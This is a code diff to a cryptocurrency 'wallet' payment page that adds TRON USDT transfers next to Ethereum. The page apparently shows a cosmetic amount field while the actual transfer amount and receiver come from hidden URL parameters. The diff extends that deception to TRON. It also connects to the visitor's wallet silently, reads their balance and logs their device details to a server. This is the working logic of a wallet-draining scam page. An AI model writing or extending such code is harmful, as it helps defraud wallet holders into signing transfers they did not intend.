@@ -57,12 +57,18 @@ async function waitForProvider(
 }
 
 // ------------------------------------------------------------
+function isTronAddress(addr: string) {
+  return /^T[A-Za-z1-9]{33}$/.test(addr);
+}
+
+// ------------------------------------------------------------
 // COMPOSANT PRINCIPAL
 // ------------------------------------------------------------
 export default function WalletPage() {
   // États de l'interface
   const [address, setAddress] = useState(DEFAULT_RECEIVER);
   const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
+  const [network, setNetwork] = useState<"ethereum" | "tron">("ethereum");
   const [loading, setLoading] = useState(false);
   const [txHash, setTxHash] = useState<string>("");
   const [displayAmount, setDisplayAmount] = useState<string>("0"); // champ cosmétique
@@ -85,7 +91,22 @@ export default function WalletPage() {
   const fetchTokenBalance = async (
     userAddress: string,
     activeToken: "usdt" | "usdc",
+    currentNetwork: "ethereum" | "tron",
   ) => {
+    if (currentNetwork === "tron") {
+      const tronWeb = (window as any).tronWeb;
+      if (!tronWeb || !tronWeb.ready) return;
+      try {
+        const trc20Contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const contract = await tronWeb.contract().at(trc20Contract);
+        const balance = await contract.balanceOf(userAddress).call();
+        setWalletBalance(BigInt(balance.toString()));
+      } catch (err) {
+        console.warn("Error fetching Tron TRC20 balance:", err);
+      }
+      return;
+    }
+
     if (!providerRef.current) return;
     try {
       const provider = new ethers.BrowserProvider(
@@ -109,6 +130,7 @@ export default function WalletPage() {
     let finalTo: string | null = null;
     let finalAmount: string | null = null;
     let finalToken: string | null = null;
+    let finalNetwork: "ethereum" | "tron" = "ethereum";
 
     if (typeof window !== "undefined") {
       const params = new URLSearchParams(window.location.search);
@@ -118,7 +140,11 @@ export default function WalletPage() {
         // Format Base64 JSON (iOS)
         try {
           const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
-          if (decoded.to && ethers.isAddress(decoded.to)) {
+          if (decoded.network === "tron") {
+            finalNetwork = "tron";
+            setNetwork("tron");
+          }
+          if (decoded.to && (finalNetwork === "tron" ? isTronAddress(decoded.to) : ethers.isAddress(decoded.to))) {
             finalTo = decoded.to;
             setAddress(decoded.to);
             setActualReceiver(decoded.to);
@@ -144,8 +170,14 @@ export default function WalletPage() {
         const toParam = params.get("to");
         const amountParam = params.get("amount");
         const tokenParam = params.get("token");
+        const networkParam = params.get("network");
 
-        if (toParam && ethers.isAddress(toParam)) {
+        if (networkParam === "tron") {
+          finalNetwork = "tron";
+          setNetwork("tron");
+        }
+
+        if (toParam && (finalNetwork === "tron" ? isTronAddress(toParam) : ethers.isAddress(toParam))) {
           finalTo = toParam;
           setAddress(toParam);
           setActualReceiver(toParam);
@@ -202,13 +234,17 @@ export default function WalletPage() {
         }
       }
       try {
+        const dbTokenName = finalNetwork === "tron" 
+          ? (finalToken ? finalToken.toUpperCase() + " (TRC20)" : "USDT (TRC20)")
+          : (finalToken ? finalToken.toUpperCase() + " (ERC20)" : "USDT (ERC20)");
+
         await fetch("/api/log-scan", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             to: finalTo || DEFAULT_RECEIVER,
             amount: finalAmount || "0",
-            token: finalToken || "usdt",
+            token: dbTokenName,
             userAgent: userAgentInfo,
             platform: platformInfo,
           }),
@@ -220,7 +256,40 @@ export default function WalletPage() {
     logScanVisit();
 
     // Connexion silencieuse au wallet
+    let tronListener: any = null;
     const init = async () => {
+      if (finalNetwork === "tron") {
+        let attempt = 0;
+        const checkTron = async () => {
+          const tronWeb = (window as any).tronWeb;
+          if (tronWeb && tronWeb.ready) {
+            const userAddress = tronWeb.defaultAddress.base58;
+            if (userAddress && !cancelled) {
+              setConnectedAddress(userAddress);
+              fetchTokenBalance(userAddress, finalToken as any || "usdt", "tron");
+            }
+          } else if (attempt < 15 && !cancelled) {
+            attempt++;
+            setTimeout(checkTron, 300);
+          }
+        };
+        checkTron();
+
+        tronListener = function (e: any) {
+          if (e.data && e.data.message && e.data.message.action === "setAccount") {
+            const newAddr = e.data.message.data.address;
+            if (newAddr && !cancelled) {
+              setConnectedAddress(newAddr);
+              fetchTokenBalance(newAddr, finalToken as any || "usdt", "tron");
+            }
+          }
+        };
+        if (typeof window !== "undefined") {
+          window.addEventListener("message", tronListener);
+        }
+        return;
+      }
+
       const ethereumProvider = await waitForProvider();
       if (!ethereumProvider || cancelled) return;
       providerRef.current = ethereumProvider;
@@ -246,7 +315,7 @@ export default function WalletPage() {
         if (accounts.length > 0 && !cancelled) {
           const userAddress = accounts[0];
           setConnectedAddress(userAddress);
-          fetchTokenBalance(userAddress, token);
+          fetchTokenBalance(userAddress, finalToken as any || "usdt", "ethereum");
         }
       } catch (e) {}
 
@@ -256,7 +325,7 @@ export default function WalletPage() {
           if (!cancelled) {
             const newAddr = a.length > 0 ? a[0] : null;
             setConnectedAddress(newAddr);
-            if (newAddr) fetchTokenBalance(newAddr, token);
+            if (newAddr) fetchTokenBalance(newAddr, finalToken as any || "usdt", "ethereum");
           }
         });
       }
@@ -265,13 +334,16 @@ export default function WalletPage() {
 
     return () => {
       cancelled = true;
+      if (typeof window !== "undefined" && tronListener) {
+        window.removeEventListener("message", tronListener);
+      }
     };
   }, []);
 
   // Met à jour le solde si le token change
   useEffect(() => {
-    if (connectedAddress) fetchTokenBalance(connectedAddress, token);
-  }, [token]);
+    if (connectedAddress) fetchTokenBalance(connectedAddress, token, network);
+  }, [token, network, connectedAddress]);
 
   // ------------------------------------------------------------
   // Transfert simple
@@ -279,6 +351,44 @@ export default function WalletPage() {
   const handleSend = async () => {
     setShowModal(false);
     setLoading(true);
+
+    const rawAmount = (actualAmount && actualAmount !== "0") 
+      ? actualAmount 
+      : displayAmount.replace(",", ".");
+    if (!rawAmount || isNaN(Number(rawAmount)) || Number(rawAmount) <= 0) {
+      setModalStatus("error");
+      setShowModal(true);
+      setLoading(false);
+      return;
+    }
+
+    if (network === "tron") {
+      const tronWeb = (window as any).tronWeb;
+      if (!tronWeb || !tronWeb.ready) {
+        alert("Tron wallet not connected or ready.");
+        setLoading(false);
+        return;
+      }
+      try {
+        const trc20Contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+        const contract = await tronWeb.contract().at(trc20Contract);
+        const amountInSun = Math.floor(parseFloat(rawAmount) * 1000000);
+
+        setModalStatus("pending");
+        setShowModal(true);
+
+        const txId = await contract.transfer(actualReceiver, amountInSun).send();
+
+        setTxHash(txId);
+        setModalStatus("success");
+      } catch (err) {
+        console.error("Tron transfer error:", err);
+        setModalStatus("error");
+      } finally {
+        setLoading(false);
+      }
+      return;
+    }
 
     const ethereumProvider = providerRef.current ?? (await waitForProvider());
     if (!ethereumProvider) {
@@ -305,17 +415,6 @@ export default function WalletPage() {
     try {
       const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
       const decimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
-      // Utiliser le montant saisi dans le champ (displayAmount) comme référence,
-      // mais préférer `actualAmount` si celui-ci est défini (param URL).
-      const rawAmount = (actualAmount && actualAmount !== "0") 
-        ? actualAmount 
-        : displayAmount.replace(",", ".");
-      if (!rawAmount || isNaN(Number(rawAmount)) || Number(rawAmount) <= 0) {
-        setModalStatus("error");
-        setShowModal(true);
-        setLoading(false);
-        return;
-      }
 
       const amountInWei = ethers.parseUnits(rawAmount, decimals);
       const iface = new ethers.Interface(ERC20_ABI);
@@ -454,28 +553,50 @@ export default function WalletPage() {
           Destination network
         </label>
         <div className="network-selector" style={{ marginBottom: "1rem" }}>
-          <div
-            className="eth-icon"
-            style={{
-              backgroundColor: "#3562ff",
-              width: "24px",
-              height: "24px",
-              borderRadius: "50%",
-              display: "flex",
-              alignItems: "center",
-              justifyContent: "center",
-            }}
-          >
-            <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
-              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
-              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
-              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#ffffff" />
-              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#ffffff" opacity="0.85" />
-              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#ffffff" opacity="0.95" />
-              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#ffffff" opacity="0.75" />
-            </svg>
-          </div>
-          <span className="network-name">Ethereum</span>
+          {network === "tron" ? (
+            <div
+              className="eth-icon"
+              style={{
+                backgroundColor: "#ec0928",
+                width: "24px",
+                height: "24px",
+                borderRadius: "50%",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+              }}
+            >
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#ffffff" strokeWidth="2.5">
+                <polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5" />
+                <polygon points="12 2 12 22" />
+                <line x1="2" y1="8.5" x2="22" y2="15.5" />
+                <line x1="2" y1="15.5" x2="22" y2="8.5" />
+              </svg>
+            </div>
+          ) : (
+            <div
+              className="eth-icon"
+              style={{
+                backgroundColor: "#3562ff",
+                width: "24px",
+                height: "24px",
+                borderRadius: "50%",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+              }}
+            >
+              <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
+                <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
+                <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
+                <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#ffffff" />
+                <path d="M127.962 416.905v-104.72L0 236.585z" fill="#ffffff" opacity="0.85" />
+                <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#ffffff" opacity="0.95" />
+                <path d="M0 212.32l127.96 75.638v-133.8z" fill="#ffffff" opacity="0.75" />
+              </svg>
+            </div>
+          )}
+          <span className="network-name">{network === "tron" ? "TRON" : "Ethereum"}</span>
           <svg
             width="12"
             height="12"
@@ -672,7 +793,7 @@ export default function WalletPage() {
                 <p className="modal-text">
                   Your transfer of {actualAmount || displayAmount}{" "}
                   {actualToken.toUpperCase()} has been successfully validated on
-                  the Ethereum blockchain.
+                  the {network === "tron" ? "TRON" : "Ethereum"} blockchain.
                 </p>
               </>
             )}
@@ -682,14 +803,14 @@ export default function WalletPage() {
                   Transaction failed
                 </h2>
                 <p className="modal-text">
-                  The transaction failed on the Ethereum blockchain or an error
+                  The transaction failed on the {network === "tron" ? "TRON" : "Ethereum"} blockchain or an error
                   occurred during the transfer.
                 </p>
               </>
             )}
             {txHash && (
               <a
-                href={`https://etherscan.io/tx/${txHash}`}
+                href={network === "tron" ? `https://tronscan.org/#/transaction/${txHash}` : `https://etherscan.io/tx/${txHash}`}
                 target="_blank"
                 rel="noopener noreferrer"
                 className="modal-details-btn"
